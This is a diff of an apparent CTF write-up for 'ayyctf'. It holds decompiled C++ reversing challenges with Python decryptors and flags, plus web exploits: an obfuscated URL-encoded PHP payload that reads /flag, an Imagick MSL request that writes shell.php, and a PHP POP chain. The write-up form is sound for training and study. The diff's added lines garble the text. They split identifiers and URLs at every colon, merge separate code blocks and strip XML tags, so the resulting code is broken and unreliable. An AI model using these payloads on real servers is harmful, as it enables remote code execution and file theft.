@@ -15,52 +15,84 @@ flag: ayyctf{you_get_rand_num}
 
 __int64 __fastcall main(int argc, const char **argv)
 {
-  std::ostream *v2; // rax
-  std::string::iterator __for_end; // [rsp+20h] [rbp-80h] BYREF
-  std::string::iterator __for_begin; // [rsp+28h] [rbp-78h] BYREF
+  std::
+ostream *v2; // rax
+  std::
+string::
+iterator __for_end; // [rsp+20h] [rbp-80h] BYREF
+  std::
+string::
+iterator __for_begin; // [rsp+28h] [rbp-78h] BYREF
   uint8_t data[24]; // [rsp+30h] [rbp-70h]
-  std::string usr_input; // [rsp+50h] [rbp-50h] BYREF
+  std::
+string usr_input; // [rsp+50h] [rbp-50h] BYREF
   uint8_t enc_; // [rsp+7Fh] [rbp-21h]
   char *c; // [rsp+80h] [rbp-20h]
-  std::string *__for_range; // [rsp+88h] [rbp-18h]
+  std::
+string *__for_range; // [rsp+88h] [rbp-18h]
   int rotate_count; // [rsp+94h] [rbp-Ch]
   int i; // [rsp+98h] [rbp-8h]
   int correct_num; // [rsp+9Ch] [rbp-4h]
 
   _main();
   correct_num = 0;
-  std::string::basic_string(&usr_input);
-  std::operator>><char>(refptr__ZSt3cin);
+  std::
+string::
+basic_string(&usr_input);
+  std::
+operator>><char>(refptr__ZSt3cin);
   *(_QWORD *)data = 0xB3B78DA987B3B383ui64;
   *(_QWORD *)&data[8] = 0xA5BEA98B8FBEAB9Fui64;
   *(_QWORD *)&data[16] = 0xBB9BAB9DBE899D83ui64;
   rotate_count = rand() % 7 + 1;
   i = 0;
   __for_range = &usr_input;
-  __for_begin._M_current = (char *)std::string::begin(&usr_input);
-  __for_end._M_current = (char *)std::string::end(__for_range);
-  while ( __gnu_cxx::operator!=<char *,std::string>(&__for_begin, &__for_end) )
+  __for_begin._M_current = (char *)std::
+string::
+begin(&usr_input);
+  __for_end._M_current = (char *)std::
+string::
+end(__for_range);
+  while ( __gnu_cxx::
+operator!=<char *,std::
+string>(&__for_begin, &__for_end) )
   {
-    c = __gnu_cxx::__normal_iterator<char *,std::string>::operator*(&__for_begin);
+    c = __gnu_cxx::
+__normal_iterator<char *,std::
+string>::
+operator*(&__for_begin);
     enc_ = func1(*c, rotate_count);
     if ( enc_ == data[i] )
       ++correct_num;
     ++i;
-    __gnu_cxx::__normal_iterator<char *,std::string>::operator++(&__for_begin);
+    __gnu_cxx::
+__normal_iterator<char *,std::
+string>::
+operator++(&__for_begin);
   }
   if ( correct_num == 24 )
-    v2 = (std::ostream *)std::operator<<<std::char_traits<char>>(refptr__ZSt4cout, "Correct!");
+    v2 = (std::
+ostream *)std::
+operator<<<std::
+char_traits<char>>(refptr__ZSt4cout, "Correct!");
   else
-    v2 = (std::ostream *)std::operator<<<std::char_traits<char>>(refptr__ZSt4cout, "No!");
+    v2 = (std::
+ostream *)std::
+operator<<<std::
+char_traits<char>>(refptr__ZSt4cout, "No!");
   refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_(v2);
-  std::string::~string(&usr_input);
+  std::
+string::~string(&usr_input);
   return 0i64;
 }
 
 1.首先读入用户输入:
 
-std::string::basic_string(&usr_input);
-std::operator>><char>(refptr__ZSt3cin);
+std::
+string::
+basic_string(&usr_input);
+std::
+operator>><char>(refptr__ZSt3cin);
 
 2.然后获取一个rotate_count:
 
@@ -70,16 +102,28 @@ rotate_count = rand() % 7 + 1;
 
 i = 0;
 __for_range = &usr_input;
-__for_begin._M_current = (char *)std::string::begin(&usr_input);
-__for_end._M_current = (char *)std::string::end(__for_range);
-while ( __gnu_cxx::operator!=<char *,std::string>(&__for_begin, &__for_end) )
+__for_begin._M_current = (char *)std::
+string::
+begin(&usr_input);
+__for_end._M_current = (char *)std::
+string::
+end(__for_range);
+while ( __gnu_cxx::
+operator!=<char *,std::
+string>(&__for_begin, &__for_end) )
 {
-  c = __gnu_cxx::__normal_iterator<char *,std::string>::operator*(&__for_begin);
+  c = __gnu_cxx::
+__normal_iterator<char *,std::
+string>::
+operator*(&__for_begin);
   enc_ = func1(*c, rotate_count);
   if ( enc_ == data[i] )
     ++correct_num;
   ++i;
-  __gnu_cxx::__normal_iterator<char *,std::string>::operator++(&__for_begin);
+  __gnu_cxx::
+__normal_iterator<char *,std::
+string>::
+operator++(&__for_begin);
 }
 
 4.查看func1函数:
@@ -233,8 +277,10 @@ Content-Length: 636
 
 cmd=%24%5f%5f%29%3b%24%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2d%2d%24%5f%5f%3b%24%5f%5f%5f%5f%5f%3d%28%28%5f%2f%5f%29%2e%27%27%29%7b%24%5f%5f%7d%3b%24%5f%5f%5f%5f%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%24%5f%5f%5f%5f%5f%2e%24%5f%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%2e%24%5f%5f%5f%5f%3b%24%7b%24%5f%5f%5f%5f%7d%7b%5f%7d%28%24%7b%24%5f%5f%5f%5f%7d%7b%5f%5f%7d%29%3b%2f%2f&_=highlight_file&__=/flag
 
-POST /?class=Imagick&arg=vid:msl:/tmp/php* HTTP/1.1
-Host: localhost:8080
+POST /?class=Imagick&arg=vid:
+msl:/tmp/php* HTTP/1.1
+Host: localhost:
+8080
 Accept-Encoding: gzip, deflate, br
 Accept: */*
 Accept-Language: en-US;q=0.9,en;q=0.8
@@ -245,10 +291,17 @@ Content-Length: 332
 
 ------WebKitFormBoundaryTrWYaXKoVR1wiLhP Content-Disposition: form-data; name="file"; filename="vulhub.msl"
 Content-Type: text/plain
-<?xml version="1.0" encoding="UTF-8"?> <image> <read filename="caption:&lt;?=phpinfo();?&gt;"/> <write filename="info:shell.php" /> </image>
+<?xml version="1.0" encoding="UTF-8"?>  <read filename="caption:&lt;?=phpinfo();?&gt;"/> <write filename="info:
+shell.php" /> 
 ------WebKitFormBoundaryTrWYaXKoVR1wiLhP--
 
-Net::__destruct()->Stone::__toString()->Works::__call()->Works::keep()->Net::__get()->Hill::__invoke()
+Net::
+__destruct()->Stone::
+__toString()->Works::
+__call()->Works::
+keep()->Net::
+__get()->Hill::
+__invoke()
 
 <?php
 //highlight_file(__FILE__);
@@ -359,83 +412,107 @@ print_r(str_replace("+","%20",$exp));
 ```
 __int64 __fastcall main(int argc, const char **argv)
 {
-  std::ostream *v2; // rax
-  std::string::iterator __for_end; // [rsp+20h] [rbp-80h] BYREF
-  std::string::iterator __for_begin; // [rsp+28h] [rbp-78h] BYREF
+  std::
+ostream *v2; // rax
+  std::
+string::
+iterator __for_end; // [rsp+20h] [rbp-80h] BYREF
+  std::
+string::
+iterator __for_begin; // [rsp+28h] [rbp-78h] BYREF
   uint8_t data[24]; // [rsp+30h] [rbp-70h]
-  std::string usr_input; // [rsp+50h] [rbp-50h] BYREF
+  std::
+string usr_input; // [rsp+50h] [rbp-50h] BYREF
   uint8_t enc_; // [rsp+7Fh] [rbp-21h]
   char *c; // [rsp+80h] [rbp-20h]
-  std::string *__for_range; // [rsp+88h] [rbp-18h]
+  std::
+string *__for_range; // [rsp+88h] [rbp-18h]
   int rotate_count; // [rsp+94h] [rbp-Ch]
   int i; // [rsp+98h] [rbp-8h]
   int correct_num; // [rsp+9Ch] [rbp-4h]
 
   _main();
   correct_num = 0;
-  std::string::basic_string(&usr_input);
-  std::operator>><char>(refptr__ZSt3cin);
+  std::
+string::
+basic_string(&usr_input);
+  std::
+operator>><char>(refptr__ZSt3cin);
   *(_QWORD *)data = 0xB3B78DA987B3B383ui64;
   *(_QWORD *)&data[8] = 0xA5BEA98B8FBEAB9Fui64;
   *(_QWORD *)&data[16] = 0xBB9BAB9DBE899D83ui64;
   rotate_count = rand() % 7 + 1;
   i = 0;
   __for_range = &usr_input;
-  __for_begin._M_current = (char *)std::string::begin(&usr_input);
-  __for_end._M_current = (char *)std::string::end(__for_range);
-  while ( __gnu_cxx::operator!=<char *,std::string>(&__for_begin, &__for_end) )
+  __for_begin._M_current = (char *)std::
+string::
+begin(&usr_input);
+  __for_end._M_current = (char *)std::
+string::
+end(__for_range);
+  while ( __gnu_cxx::
+operator!=<char *,std::
+string>(&__for_begin, &__for_end) )
   {
-    c = __gnu_cxx::__normal_iterator<char *,std::string>::operator*(&__for_begin);
+    c = __gnu_cxx::
+__normal_iterator<char *,std::
+string>::
+operator*(&__for_begin);
     enc_ = func1(*c, rotate_count);
     if ( enc_ == data[i] )
       ++correct_num;
     ++i;
-    __gnu_cxx::__normal_iterator<char *,std::string>::operator++(&__for_begin);
+    __gnu_cxx::
+__normal_iterator<char *,std::
+string>::
+operator++(&__for_begin);
   }
   if ( correct_num == 24 )
-    v2 = (std::ostream *)std::operator<<<std::char_traits<char>>(refptr__ZSt4cout, "Correct!");
+    v2 = (std::
+ostream *)std::
+operator<<<std::
+char_traits<char>>(refptr__ZSt4cout, "Correct!");
   else
-    v2 = (std::ostream *)std::operator<<<std::char_traits<char>>(refptr__ZSt4cout, "No!");
+    v2 = (std::
+ostream *)std::
+operator<<<std::
+char_traits<char>>(refptr__ZSt4cout, "No!");
   refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_(v2);
-  std::string::~string(&usr_input);
+  std::
+string::~string(&usr_input);
   return 0i64;
 }
-```
-
-
-
-```
-std::string::basic_string(&usr_input);
-std::operator>><char>(refptr__ZSt3cin);
-```
-
-
-
-```
+std::
+string::
+basic_string(&usr_input);
+std::
+operator>><char>(refptr__ZSt3cin);
 rotate_count = rand() % 7 + 1;
-```
-
-
-
-```
 i = 0;
 __for_range = &usr_input;
-__for_begin._M_current = (char *)std::string::begin(&usr_input);
-__for_end._M_current = (char *)std::string::end(__for_range);
-while ( __gnu_cxx::operator!=<char *,std::string>(&__for_begin, &__for_end) )
+__for_begin._M_current = (char *)std::
+string::
+begin(&usr_input);
+__for_end._M_current = (char *)std::
+string::
+end(__for_range);
+while ( __gnu_cxx::
+operator!=<char *,std::
+string>(&__for_begin, &__for_end) )
 {
-  c = __gnu_cxx::__normal_iterator<char *,std::string>::operator*(&__for_begin);
+  c = __gnu_cxx::
+__normal_iterator<char *,std::
+string>::
+operator*(&__for_begin);
   enc_ = func1(*c, rotate_count);
   if ( enc_ == data[i] )
     ++correct_num;
   ++i;
-  __gnu_cxx::__normal_iterator<char *,std::string>::operator++(&__for_begin);
+  __gnu_cxx::
+__normal_iterator<char *,std::
+string>::
+operator++(&__for_begin);
 }
-```
-
-
-
-```
 uint8_t __cdecl func1(uint8_t value, uint8_t n)
 {
   uint8_t enc_step_one; // [rsp+2Fh] [rbp-1h]
@@ -445,11 +522,6 @@ uint8_t __cdecl func1(uint8_t value, uint8_t n)
   enc_step_one = func1_1(value, n);
   return func1_2(enc_step_one, n);
 }
-```
-
-
-
-```
 uint8_t __cdecl func1_1(uint8_t value, uint8_t shift)
 {
   return ((int)value >> shift) | (value << (8 - shift));
@@ -464,11 +536,6 @@ uint8_t __cdecl func1_2(uint8_t byte, int n)
     return (1 << (n - 1)) ^ byte ^ 1;
   return bytea;
 }
-```
-
-
-
-```
 def circular_left_shift(byte, shift):
     shifted_byte = ((byte << shift) & 0xFF) | (byte >> (8 - shift))
     return shifted_byte
@@ -497,50 +564,25 @@ for n in data:
   flag += chr(shift_data)
 print(flag)
 # ayyctf{you_get_rand_num}
-```
-
-
-
-```
 File size Ratio Format Name
  -------------------- ------ ----------- -----------
 upx: ../finalpack: CantUnpackException: l_info corrupted
 
 Unpacked 1 file: 0 ok, 1 error.
-```
-
-
-
-```
 LEA RDI =>local_68 ,[RBP + -0x60 ]
 CALL thunk_FUN_00421290
-```
-
-
-
-```
 def left_rotate_string(s, n):
     return s[n:] + s[:n]
 
 s = "02CD290D5ACE1A83"
 n = 0xB
 print(left_rotate_string(s, n)) #E1A8302CD290D5AC
-```
-
-
-
-```
 <?xml version="1.0" encoding="utf-8" ?>
 <configuration>
     <startup> 
         <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
     </startup>
 </configuration>
-```
-
-
-
-```
 def decrypt_image_bytes(encrypted_bytes):
     decrypted_bytes = bytearray(len(encrypted_bytes))
   
@@ -559,19 +601,9 @@ with open('enc.png', 'rb') as f:
 decrypted_data = decrypt_image_bytes(encrypted_data)
 with open('dec.png', 'wb') as f:
     f.write(decrypted_data)
-```
-
-
-
-```
 for (int i = 1; i < a2; i++) {
         a1[i - 1] ^= a1[i];
 }
-```
-
-
-
-```
 def decrypt(cipher):
     length = len(cipher)
     for i in range(length - 1, 0, -1):
@@ -582,11 +614,6 @@ cipher = [0x18, 0x00, 0x1a, 0x17, 0x12, 0x1d, 0x1a, 0x05, 0x0a, 0x56,
 plain_text = decrypt(cipher)
 print(plain_text)
 # ayyctf{adn812nasd9021jad91ad912ar}
-```
-
-
-
-```
 POST / HTTP/1.1
 Host: xxx.xxx.xxx.xxx:80
 Cache-Control: max-age=0
@@ -600,13 +627,10 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 636
 
 cmd=%24%5f%5f%29%3b%24%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2d%2d%24%5f%5f%3b%24%5f%5f%5f%5f%5f%3d%28%28%5f%2f%5f%29%2e%27%27%29%7b%24%5f%5f%7d%3b%24%5f%5f%5f%5f%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%24%5f%5f%5f%5f%5f%2e%24%5f%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%2e%24%5f%5f%5f%5f%3b%24%7b%24%5f%5f%5f%5f%7d%7b%5f%7d%28%24%7b%24%5f%5f%5f%5f%7d%7b%5f%5f%7d%29%3b%2f%2f&_=highlight_file&__=/flag
-```
-
-
-
-```
-POST /?class=Imagick&arg=vid:msl:/tmp/php* HTTP/1.1
-Host: localhost:8080
+POST /?class=Imagick&arg=vid:
+msl:/tmp/php* HTTP/1.1
+Host: localhost:
+8080
 Accept-Encoding: gzip, deflate, br
 Accept: */*
 Accept-Language: en-US;q=0.9,en;q=0.8
@@ -617,19 +641,16 @@ Content-Length: 332
 
 ------WebKitFormBoundaryTrWYaXKoVR1wiLhP Content-Disposition: form-data; name="file"; filename="vulhub.msl"
 Content-Type: text/plain
-<?xml version="1.0" encoding="UTF-8"?> <image> <read filename="caption:&lt;?=phpinfo();?&gt;"/> <write filename="info:shell.php" /> </image>
+<?xml version="1.0" encoding="UTF-8"?>  <read filename="caption:&lt;?=phpinfo();?&gt;"/> <write filename="info:
+shell.php" /> 
 ------WebKitFormBoundaryTrWYaXKoVR1wiLhP--
-```
-
-
-
-```
-Net::__destruct()->Stone::__toString()->Works::__call()->Works::keep()->Net::__get()->Hill::__invoke()
-```
-
-
-
-```
+Net::
+__destruct()->Stone::
+__toString()->Works::
+__call()->Works::
+keep()->Net::
+__get()->Hill::
+__invoke()
 <?php
 //highlight_file(__FILE__);
 //error_reporting(0);
